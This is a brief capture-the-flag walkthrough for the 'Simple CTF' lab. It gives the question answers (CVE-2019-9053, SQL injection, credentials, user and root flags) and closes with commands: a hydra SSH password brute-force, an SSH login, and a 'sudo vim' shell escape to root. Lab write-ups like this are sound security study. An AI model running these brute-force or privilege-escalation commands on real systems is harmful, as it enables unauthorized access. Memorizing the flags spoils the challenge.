# Simple CTF

January 02, 2024

username - mitch
password - secret

salt for pass - 1dac0d92e9fa6bb2	s
-------------------------------------

- How many services are running under port 1000?
	- `2`

- What is running on the higher port?
	- `ssh`

- What's the CVE you're using against the application?
	- `CVE-2019-9053`

- To what kind of vulnerability is the application vulnerable?
	- `sqli`

- What's the password?
	- `secret`

- Where can you login with the details obtained?
	- `ssh`

- What's the user flag?
	- `G00d j0b, keep up!`

- Is there any other user in the home directory? What's its name?
	- `sunbath`

- What can you leverage to spawn a privileged shell?
	- `vim`

- What's the root flag?
	- `W3ll d0n3. You made it!`



hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.107.180:2222

ssh ssh://mitch@10.10.107.180:2222

sudo -l

sudo vim -c ':!/bin/sh'